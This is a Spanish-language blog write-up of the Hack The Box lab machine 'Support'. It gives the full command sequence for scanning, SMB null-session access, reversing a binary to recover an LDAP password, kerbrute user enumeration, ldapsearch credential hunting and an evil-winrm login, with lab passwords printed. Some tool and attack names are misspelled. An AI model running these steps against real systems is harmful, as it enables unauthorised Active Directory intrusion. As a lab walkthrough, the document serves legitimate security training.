---
title: "WriteUp Machine - Support [INACTIVA]"
excerpt: "Resolucion de la maquina de Hack The Box 'Support' - Session X"
header:
  teaser: "/assets/images/Perfection.png"
categories:
  - Blog
---
## AD

En primer lugar, **AD (Active Directory) es una tecnología diseñada por Microsoft** e introducida en Windows 2000 Server  cuyo objetivo es el de definir un conjunto de **componentes centralizados** que se encargan de **almacenar, organizar y distribuir información a las máquinas que hacen parte de una red de ordenadores**. Para que exista un AD, es necesario contar con ordenadores que tengan una versión «Server» de Windows, los cuales se encargarán precisamente de mantener la información del entorno. Ahora bien, la información que se guarda en estos servidores se compone de unidades llamadas objetos y pueden ser prácticamente cualquier cosa: Usuarios, ordenadores, grupos, unidades organizativas, servicios, etc.
## Fase de reconocimiento 

Verificaremos si la maquina esta encendida y tenemos conexión con ella.

```
ping -c 1 10.10.11.174
```

Sabemos que es Windows por tu TTL -> 128 (Windows) - 64 (Linux)
En HackTheBox podemos meterle un treiroot

```
ping -c 1 10.10.11.174 -R
```

podemos ver si existe algo intermediario

Empezaremos metiéndole un nmap para poder hacer un reconocimiento de sus puertos y los servicios que están corriendo por el mismo. 

65.535


```
nmap -p- --open -sS -sCV --min-rate 5000 10.10.11.174 -oN info_basic
```

```
rustscan --ulimit=5000 --range=1-65535 -a 10.129.11.32 -- -A -sc -oN
```


Por medio del 445 sabemos que corre SBM, usando la herramienta SBM client/smbmap podemos probar un null session para poder listar los recursos compartidos a nivel de red del lado de la maquina.

```
smbmap -H 10.10.11.174 -u name 
```

nos llama la atencion support-tools así que descargarnos los recursos existentes.

Como parte del reconocimiento debemos saber ante que no enfrentamos, entonces usamos crackmapexec para enumerar el servicio SMB 

```
crackmapexec smb 10.10.11.174
```

vamos directamente a editar el /etc/hosts a fin de no tener problemas por si el tema va con Kerberos.

Para los que no sepan el /etc/hosts básicamente, permite a un sistema resolver nombres de dominio en direcciones IP sin necesidad de conectarse a un servidor DNS externo.

```
10.10.11.174 dc dc.support.htb support.htb
```

Ahora ya nos debería resolver los dominios contemplados.

### Fase de explotación

Nos conectaremos al servicio smb usando la null session encontrada para poder descargarnos los archivos para saber si existe algo interesante.

```
smbclient //10.10.11.174/support-tools -N 
```

vamos a descargarnos UserInfo.exe.zip

```
get UserInfo.exe.zip
```

vamos a nuestra maquina y lo descomprimimos para saber que tenemos y nos vamos a revisar a ver si existe algo de utilidad.

vamos entonces a centrarnos en el archivo UserInfo.exe que es un binario para Windows usaremos string para poder las cadenas de carcateres imprimibles

```
strings -e l UserInfo.exe
```

Notamos que parece tramitar consultas a los servicio de LDAP y sabemos que Kerberos esta expuesto.

Por ello buscaremos Kerburter que esta hecho en Go y le hechamos un ` go build . ` para poder usarlo, lo que haremos es comprobar la existencia de usuarios

```
./kerbrute userenum -d support.htb --dc 10.10.11.174 users 
```

```
./kerbrute userenum -d support.htb --dc 10.10.11.174 /usr/src/SecLists/Usernames/xato-net-10-million-usernames.txt
```

Entonces podemos enumerar usuarios validos, a nos que nos bloquen.

Siempre en AD nosotros podemos intentar con una serie de usuarios validos un as-rep roast attack:

Kerberos es un protocolo de autenticación de red que proporciona un método seguro para la verificación de identidad entre clientes y servidores en una red informática.

Un AS-REP Roast Attack explota una debilidad en la forma en que el protocolo Kerberos maneja las solicitudes de autenticación. En lugar de enviar una solicitud TGT completa, el atacante envía una solicitud AS-REQ solicitando un TGT sin proporcionar las credenciales del usuario. Si el servidor acepta estas solicitudes AS-REQ, devuelve un TGT cifrado con la clave de sesión del usuario. y nosotros como atacante podemos recopilar estos TGT cifrados y luego intentar descifrarlos sin la necesidad de conocer las contraseñas de los usuarios.

Sim embargo la verdad aunque esto es una alternativa, aquí no contamos con la configuración seteada de DONT RIQUAI PRECAUP  de kerberos.

Por el momento vamos a analizar el .exe para ello, vamos a llevarnos esto a mi maquina Windows

Vamos a abrir un servidor HTTP con Python para poder pasarnos la información.

```
python3 -m http.server 80
```

Y lo abrimos en la maquina Windows, simplemente con el navegador y nos descargamos el archivo.

```
http://192.168.100.23/
```

Podemos ver como funciona porque esto será útil para luego poder probar el programa

```
.\UserInfo.exe
```

E instalaremos dnSpy para poder ver como funciona el programa a bajo a nivel, existen herramientas mas potentes pero por el momento y para la comprensión de todos usare dnSpy por su simplicidad de uso.

Iremos directo a 

```
https://github.com/dnSpy/dnSpy
```

lo descargamos e instalamos. Abrimos el archivo y vamos ver las consultad LDAP

Al parecer esto esta haciendo unas cosas raras con la contraseña a fin de que no se vea en texto claro y tenemos muchas alternativas para poder verla, pero me iré por usar BreakPoints para poder controlar el flujo del programa.

Usaremos la consulta:

```
find -firts * -last *
```

F10 -> paso siguiente
F5 -> Ejecutar Binario
F9 -> BreakPoint

Obtenemos `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` y como sabemos que el usuario LDAP existe 
Para comprobar el uso de esta key podemos usar 

```
crackmapexec winrm 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Podríamos intentar el Kerberos Grantyn atack pero no obtendríamos nada.

Aqui tenemos muchas opciones, pero nosotros como ya tenemos el usuario y la contraseña para LDAP, ahora podemos intentar enumerarlo. Podemos utilizar herramientas como ldapsearch para hacerlo.

```
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | tee ldapsearch.log
```

encontramos:

```
Ironside47pleasure40Watchful
```

Que le pertenece al usuario support.
Ahora podemos intentar sin hacer validación, conectarnos a winrm mediante evil-winrm para probar si la contraseña es correcta.

```
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep -i "samaccountname: support" -B 40
```

Entonces como tenemos el puerto 5985 podemos usarlo, pues pertenece al servicio de administración remota de Windows, y podríamos usar evilWinrm, y conectarnos a la maquina, pero antes deberíamos validarlo  para saber si de entrada es correcto lo que hemos hecho.

```
crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
```

y como nos pone un "pwned!" sabemos que es valido.

```
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

nos conectamos y podemos ver la flag del usuario.



